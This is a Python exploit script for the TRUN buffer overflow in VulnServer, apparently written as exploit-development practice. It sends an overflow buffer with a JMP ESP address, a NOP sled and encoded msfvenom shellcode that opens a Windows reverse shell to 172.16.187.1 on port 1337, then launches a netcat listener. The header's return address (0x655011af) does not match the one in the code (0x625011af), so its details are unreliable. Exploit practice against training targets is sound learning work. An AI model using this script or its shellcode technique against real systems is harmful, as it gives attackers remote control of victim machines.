#!/usr/bin/env python
#---------------------------------------------------------------------------------------------#
# Software      = VulnServer                                                                  #
# Download Link = https://github.com/stephenbradshaw/vulnserver                               #
# Date          = 1/28/2018                                                                   #
# Author        = Twitter: @_anakein  | Telegram: @Anakein                                    #
# Tested on     = Windows 7 Ultimate - SP1                                                    #
# EIP Offset    = 2006                                                                        #
# Badchars      = \x00                                                                        #
# RET Address   = 0x655011af : "\xFF\xE4" | [VulnServer.exe]                                  #
# Usage         = python exploit.py <target IP> <port>                                        #        
#---------------------------------------------------------------------------------------------#

import socket as so
import sys, struct
import subprocess

try:
    server  = str(sys.argv[1])
    port    = int(sys.argv[2])

except:
    print("Usage: python %s <ip> <port>" % sys.argv[0])
    sys.exit(0)

s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect((server, port))
s.recv(1024)
s.send("HELP\r\n")

#msfvenom -p windows/shell_reverse_tcp LHOST=172.16.187.1 LPORT=1337 -b "\x00" -f python x86/shikata_ga_nai EXITFUNC=thread

buf =  ""
buf += "\xda\xc7\xb8\x4e\xc9\x3e\xbf\xd9\x74\x24\xf4\x5b\x29"
buf += "\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x13\x03\x0d\xda\xdc"
buf += "\x4a\x6d\x34\xa2\xb5\x8d\xc5\xc3\x3c\x68\xf4\xc3\x5b"
buf += "\xf9\xa7\xf3\x28\xaf\x4b\x7f\x7c\x5b\xdf\x0d\xa9\x6c"
buf += "\x68\xbb\x8f\x43\x69\x90\xec\xc2\xe9\xeb\x20\x24\xd3"
buf += "\x23\x35\x25\x14\x59\xb4\x77\xcd\x15\x6b\x67\x7a\x63"
buf += "\xb0\x0c\x30\x65\xb0\xf1\x81\x84\x91\xa4\x9a\xde\x31"
buf += "\x47\x4e\x6b\x78\x5f\x93\x56\x32\xd4\x67\x2c\xc5\x3c"
buf += "\xb6\xcd\x6a\x01\x76\x3c\x72\x46\xb1\xdf\x01\xbe\xc1"
buf += "\x62\x12\x05\xbb\xb8\x97\x9d\x1b\x4a\x0f\x79\x9d\x9f"
buf += "\xd6\x0a\x91\x54\x9c\x54\xb6\x6b\x71\xef\xc2\xe0\x74"
buf += "\x3f\x43\xb2\x52\x9b\x0f\x60\xfa\xba\xf5\xc7\x03\xdc"
buf += "\x55\xb7\xa1\x97\x78\xac\xdb\xfa\x14\x01\xd6\x04\xe5"
buf += "\x0d\x61\x77\xd7\x92\xd9\x1f\x5b\x5a\xc4\xd8\x9c\x71"
buf += "\xb0\x76\x63\x7a\xc1\x5f\xa0\x2e\x91\xf7\x01\x4f\x7a"
buf += "\x07\xad\x9a\x2d\x57\x01\x75\x8e\x07\xe1\x25\x66\x4d"
buf += "\xee\x1a\x96\x6e\x24\x33\x3d\x95\xaf\x90\xd2\x2e\x2e"
buf += "\x81\xd0\x50\x34\x68\x5c\xb6\x5c\x9a\x08\x61\xc9\x03"
buf += "\x11\xf9\x68\xcb\x8f\x84\xab\x47\x3c\x79\x65\xa0\x49"
buf += "\x69\x12\x40\x04\xd3\xb5\x5f\xb2\x7b\x59\xcd\x59\x7b"
buf += "\x14\xee\xf5\x2c\x71\xc0\x0f\xb8\x6f\x7b\xa6\xde\x6d"
buf += "\x1d\x81\x5a\xaa\xde\x0c\x63\x3f\x5a\x2b\x73\xf9\x63"
buf += "\x77\x27\x55\x32\x21\x91\x13\xec\x83\x4b\xca\x43\x4a"
buf += "\x1b\x8b\xaf\x4d\x5d\x94\xe5\x3b\x81\x25\x50\x7a\xbe"
buf += "\x8a\x34\x8a\xc7\xf6\xa4\x75\x12\xb3\xc5\x97\xb6\xce"
buf += "\x6d\x0e\x53\x73\xf0\xb1\x8e\xb0\x0d\x32\x3a\x49\xea"
buf += "\x2a\x4f\x4c\xb6\xec\xbc\x3c\xa7\x98\xc2\x93\xc8\x88"

crash = 3000
buf1 = '\x41'*2006
jmpesp = struct.pack("<L",0x625011af)

buffer = buf1 + jmpesp + '\x90'*17 + buf + 'C'*(crash-2006-4-17-351)
try:
    s.recv(1024)
    s.send('TRUN .' + buffer)
    print("Incoming shell")
    subprocess.call(['nc -lvp 1337'], shell=True)

except Exception,msg:
        print("Check you connection: nc <ip_server> <port>")
        sys.exit(0)
